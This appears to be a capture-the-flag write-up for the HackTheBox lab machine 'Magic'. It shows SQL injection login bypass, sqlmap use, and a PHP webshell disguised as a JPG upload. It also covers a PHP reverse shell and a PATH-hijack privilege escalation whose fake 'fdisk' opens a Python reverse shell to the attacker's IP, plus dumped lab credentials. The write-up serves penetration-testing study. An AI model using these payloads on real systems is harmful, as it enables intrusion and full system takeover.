# Magic

IP: 10.10.10.185

## NMAP
	PORT 22		OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
				Doesn't allow password auth, only PUBLICKEY
	PORT 80  	Apache httpd 2.4.29
				Title: 	Magic Portfolio
				Got:	/login.php
						Method POST -> username&password
						SQLi works: admin / 'or'1'='1, and let upload images.
						"Sorry, only JPG, JPEG & PNG files are allowed."
						Uploaded php.PNG file -> "What are you trying to do there?""
						Some js files

## SQLMAP
```
sqlmap -u http://10.10.10.185/login.php --data="username=admin&password=%27or%271%27%3D%271"
```

Current user: theseus@localhost
	DBCurrentUser has no enough privileges for get passwords

Current DB: Magic
	Tables: 1
		Login
		Columns: 3
			+----------+--------------+
			| Column   | Type         |
			+----------+--------------+
			| id       | int(6)       |
			| password | varchar(100) |
			| username | varchar(50)  |
			+----------+--------------+

			Values: 1
				1 | admin | Th3s3usW4sK1ng

Another DB: information_schema
	Tables: 61
		Table: user_privileges
		[1 entry]
		+-----------------------+--------------+---------------+----------------+
		| GRANTEE               | IS_GRANTABLE | TABLE_CATALOG | PRIVILEGE_TYPE |
		+-----------------------+--------------+---------------+----------------+
		| 'theseus'@'localhost' | NO           | def           | USAGE          |
		+-----------------------+--------------+---------------+----------------+



No more get... Rabbit hole?

## Burp Suite

Sent a file (HelloWorld.jpg) with the first bytes of 5.jpeg (file downloaded from the website) and the next code:
```
<html><?php
echo shell_exec('whoami');
echo shell_exec('pwd');
?></html>
```

Got:
```
www-data /var/www/Magic/images/uploads
```

Now we can try to upload files using sqlmap or upload them manually.
Let's try with p0wny-shell:

Alert when send any command "Error while parsing response: SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data"

So let's continue manually (thanks Burp Repeater).

- Got /etc/passwd

Sent ls to /etc/ssh and got this:

```
total 596 drwxr-xr-x 2 root root 4096 Oct 21 2019 
. drwxr-xr-x 127 root root 12288 Mar 20 15:27 .. 
-rw-r--r-- 1 root root 553122 Mar 4 2019 moduli 
-rw-r--r-- 1 root root 1580 Mar 4 2019 ssh_config 
-rw------- 1 root root 227 Oct 15 2019 ssh_host_ecdsa_key 
-rw-r--r-- 1 root root 173 Oct 15 2019 ssh_host_ecdsa_key.pub 
-rw------- 1 root root 399 Oct 15 2019 ssh_host_ed25519_key 
-rw-r--r-- 1 root root 93 Oct 15 2019 ssh_host_ed25519_key.pub 
-rw------- 1 root root 1679 Oct 15 2019 ssh_host_rsa_key 
-rw-r--r-- 1 root root 393 Oct 15 2019 ssh_host_rsa_key.pub 
-rw-r--r-- 1 root root 338 Oct 15 2019 ssh_import_id 
-rw-r--r-- 1 root root 3259 Oct 21 2019 sshd_config 
```

/etc/ssh/ssh_host_rsa_key.pub (error: Load key "ssh_host_rsa_key.pub": invalid format)
```
AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX root@ubuntu 
```
/etc/ssh/ssh_host_ed25519_key.pub 
```
AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1 root@ubuntu
```
/etc/ssh/ssh_host_ecdsa_key.pub
```
AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ= root@ubuntu 
```
/etc/ssh/ssh_import_id
```
{ "_comment_": "This file is JSON syntax and will be loaded by ssh-import-id to obtain the URL string, which defaults to launchpad.net. The following URL *must* be an https address with a valid, signed certificate!!! %s is the variable that will be filled by the ssh-import-id utility.", "URL": "https://launchpad.net/~%s/+sshkeys" } 
```
/etc/ssh/moduli
Huge file with a lot of files with the format:
```
# Time Type Tests Tries Size Generator Modulus
20160301052556 2 6 100 2047 5 DA57B18976E9C55CEAC3BFFF70419A1550258EA7359400BD4FAC8F4203B73E0BC54D62C0A2D9AA9B543FACA0290514EA426DE6FEF897CB858243511DCE5170420C799D888DCFDC4502FF49B66F34E75C00E98A55408A791FF5CFEA7C288F8E6664226A6A90BE237D2E40C207B5AD0CAEDFDA4946E63AEA351A09EF462515FED4098694241CD07E2CB7727B39B8B1B9467D72DFB908D8169F5DB3CD5A6BEBE1344C585A882508B760402E86EB9B5548A7B98635ECFCDC02FF62B29C53847142FC598ADC66F622F6E9F73BDF02B3D795C0DF23D00E5A3A7748F3E1D5B06F46D4568CE3F4CC57E67D4C36DF5C12800620698C727CC5F5BCACF3B7E17E37D19F4647
```
It seems that there are pre-generated group parameters for Diffie-Hellman (https://security.stackexchange.com/questions/41941/consequences-of-tampered-etc-ssh-moduli#41947)

Interesting comment in sshd_config:
```
# Expect .ssh/authorized_keys2 to be disregarded by default in future. AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2 
```

Sent: (Payload got from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)
```
<html><?php
$sock=fsockopen("10.10.14.17",1999);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?></html>
```
after a jpg header (tunnel_request_burp)
and created a tunnel with 
```
sudo nc -nlvp 1999
```

## Got Shell with WWW-DATA
Now we need to privesc to Theseus (or root, why not)

ps aux | grep theseus
``` 
$ ps aux | grep theseus
root      1606  0.0  0.0  62168  3368 pts/0    S    11:26   0:00 su theseus
theseus   1608  0.0  0.1  76760  7816 ?        Ss   11:26   0:00 /lib/systemd/systemd --user
theseus   1609  0.0  0.0 195896  2524 ?        S    11:26   0:00 (sd-pam)
theseus   1620  0.0  0.1  29488  4904 pts/0    S    11:26   0:00 bash
root      2051  0.0  0.0  62168  3392 pts/3    S    11:41   0:00 su theseus
theseus   2052  0.0  0.1  29620  5060 pts/3    S+   11:41   0:00 bash
www-data  3243  0.0  0.0  11460   992 ?        S    14:13   0:00 grep theseus
```

Also, we have a filename in our root called db.php5, with the content copied below:
```
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}

```

So, we now have user and password. Let's see how to spawn a tty:
https://netsec.ws/?p=337
```
python3 -c 'import pty; pty.spawn("/bin/sh")'

$ ttttyy

/dev/pts/4

$ ssuu  --  tthheesseeuuss

Password: iamkingtheseus

su: Authentication failure
$ ssuu  --  tthheesseeuuss

Password: Th3s3usW4sK1ng

theseus@ubuntu:~$ wwhhooaammii

theseus
theseus@ubuntu:~$ 

```

The db password wasn't the correct one, but it was the one we got using sqlmap

So we are now Theseus. Good job!

## Getting Root

As theseus, let's execute pspy and open another bash for working (complete pspy32 log in pspy32.log file).

First of all, try to find any sudo permissions, but there aren't.
So let's find which 
(Complete out log in find_perm.log)
```
theseus@ubuntu:/$ find  /  -perm  -u=s  -type  f  2>/dev/null
[...]
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
```

sysinfo is not an usual tool so let's see what it does (Complete log in sysinfo.log)
This is an extract of the output:
```
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x44c94251

Device     Boot Start      End  Sectors Size Id Type
/dev/sda1  *     2048 41940991 41938944  20G 83 Linux

```

It's like an fdisk -l command, which we can't run:
```
theseus@ubuntu:/$ //ssbbiinn//ffddiisskk  --ll

fdisk: cannot open /dev/loop0: Permission denied
fdisk: cannot open /dev/loop1: Permission denied
fdisk: cannot open /dev/loop2: Permission denied
fdisk: cannot open /dev/loop3: Permission denied
fdisk: cannot open /dev/loop4: Permission denied
fdisk: cannot open /dev/loop5: Permission denied
fdisk: cannot open /dev/loop6: Permission denied
fdisk: cannot open /dev/loop7: Permission denied
fdisk: cannot open /dev/sr0: Permission denied
fdisk: cannot open /dev/fd0: Permission denied
fdisk: cannot open /dev/sda: Permission denied
fdisk: cannot open /dev/loop8: Permission denied
fdisk: cannot open /dev/loop9: Permission denied
fdisk: cannot open /dev/loop10: Permission denied
fdisk: cannot open /dev/loop11: Permission denied
```

So maybe "sysinfo" is running privileged process. Let's see if there are any news on pspy:

```
2020/04/26 07:55:21 CMD: UID=0    PID=5551   | sysinfo 
2020/04/26 07:55:22 CMD: UID=0    PID=5558   | fdisk -l 
2020/04/26 07:55:22 CMD: UID=0    PID=5557   | sh -c fdisk -l 
2020/04/26 07:55:23 CMD: UID=0    PID=5559   | sh -c cat /proc/cpuinfo 
2020/04/26 07:55:23 CMD: UID=0    PID=5562   | free -h 
2020/04/26 07:55:23 CMD: UID=0    PID=5561   | sh -c free -h 
```

Bingo!

Let's create a file in /tmp with our payload:
```
theseus@ubuntu:/tmp$ mkdir payloads
theseus@ubuntu:/tmp$ cd payloads
theseus@ubuntu:/tmp/payload$ wget 10.10.14.17/fdisk
theseus@ubuntu:/tmp/payload$ cat fdisk
export RHOST="10.10.14.17";export RPORT=4242;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
theseus@ubuntu:/tmp/payload$ export PATH=/tmp/payload:$PATH
theseus@ubuntu:/tmp/payload$ echo $PATH
/tmp/payload:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
Let's now open a nc in our machine, and run again sysinfo, and...

```
kali@kali:/var/www/html$ sudo nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.185] 43792
root@ubuntu:/tmp/payload# whoami
root
```

That's All Folks! :)





